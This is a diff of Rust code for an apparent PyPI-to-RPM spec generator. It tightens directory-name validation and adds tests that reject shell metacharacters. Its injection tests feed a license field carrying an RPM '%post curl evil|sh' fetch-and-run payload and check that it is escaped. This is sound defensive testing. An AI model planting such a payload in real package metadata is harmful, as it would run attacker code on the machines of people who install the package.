@@ -815,15 +815,11 @@ fn replace_version_component(dir: &str, version: &str) -> String {
 }
 
 /// Whether a directory name may be written unescaped into a `%autosetup -n`
-/// line. Only characters found in real source-tree names are accepted: no
-/// whitespace or control characters, no `%` macro, no `/` or shell
-/// metacharacters.
+/// line. Same rule as the sdist unpacker (`ap_ecosystem::sdist`), so a name
+/// accepted there is accepted here: no whitespace or control characters, no
+/// `%` macro, no `/` or shell metacharacters.
 fn is_safe_autosetup_dir(dir: &str) -> bool {
-    !matches!(dir, "" | "." | "..")
-        && dir.len() <= 255
-        && dir
-            .chars()
-            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '+' | '~'))
+    ap_ecosystem::sdist::is_safe_top_level_dir(dir)
 }
 
 /// The expanded `%autosetup -n` directory for a spec with the given name and
@@ -6716,6 +6712,13 @@ mod review_fix_tests {
         }
         assert!(is_safe_autosetup_dir("thing-1.0"));
         assert!(is_safe_autosetup_dir("MarkupSafe-3.0.3"));
+        assert!(is_safe_autosetup_dir("Pyöpt-1.0"));
+        for bad in [
+            "a b", "a\nb", "a%b", "a/b", "a\\b", "a'b", "a;b", "a$b", "a`b", "a|b", "a&b",
+            "a\u{7}b",
+        ] {
+            assert!(!is_safe_autosetup_dir(bad), "{bad:?}");
+        }
     }
 
     #[test]
@@ -8655,7 +8658,10 @@ mod wheel_generator_tests {
 mod license_url_injection_tests {
     use super::*;
 
-    fn release(license: ap_ecosystem::pypi::License, homepage: Option<&str>) -> ap_ecosystem::pypi::Release {
+    fn release(
+        license: ap_ecosystem::pypi::License,
+        homepage: Option<&str>,
+    ) -> ap_ecosystem::pypi::Release {
         ap_ecosystem::pypi::Release {
             name: "pkg".to_string(),
             version: "1.0".to_string(),
@@ -8695,7 +8701,9 @@ mod license_url_injection_tests {
 
     fn no_injected_line(spec: &str) {
         assert!(
-            !spec.lines().any(|l| l.starts_with("%post") || l.starts_with("curl")),
+            !spec
+                .lines()
+                .any(|l| l.starts_with("%post") || l.starts_with("curl")),
             "{spec}"
         );
     }
@@ -8735,7 +8743,10 @@ mod license_url_injection_tests {
             None,
         );
         let spec = sdist_spec(&r);
-        assert!(spec.contains("License:        MIT OR Apache-2.0\n"), "{spec}");
+        assert!(
+            spec.contains("License:        MIT OR Apache-2.0\n"),
+            "{spec}"
+        );
         assert!(
             spec.contains("URL:            https://pypi.org/project/%{name}\n"),
             "{spec}"
@@ -8750,7 +8761,10 @@ mod license_url_injection_tests {
         );
         let spec = monorepo_skeleton("pkg", "1.0", &[], Some(&r));
         no_injected_line(&spec);
-        assert!(spec.contains("License:        MIT %%post curl evil|sh\n"), "{spec}");
+        assert!(
+            spec.contains("License:        MIT %%post curl evil|sh\n"),
+            "{spec}"
+        );
     }
 
     #[test]
@@ -8759,9 +8773,20 @@ mod license_url_injection_tests {
             ap_ecosystem::pypi::License::FreeText("GPL %post".to_string()),
             Some("https://example.org/%x"),
         );
-        let spec = wheel_binary_skeleton_shared("pkg", "1.0", "pkg-1.0-py3-none-any.whl", &r, None, None, &[]);
+        let spec = wheel_binary_skeleton_shared(
+            "pkg",
+            "1.0",
+            "pkg-1.0-py3-none-any.whl",
+            &r,
+            None,
+            None,
+            &[],
+        );
         assert!(spec.contains("License:        GPL %%post\n"), "{spec}");
-        assert!(spec.contains("URL:            https://example.org/%%x\n"), "{spec}");
+        assert!(
+            spec.contains("URL:            https://example.org/%%x\n"),
+            "{spec}"
+        );
         no_injected_line(&spec);
     }
 }
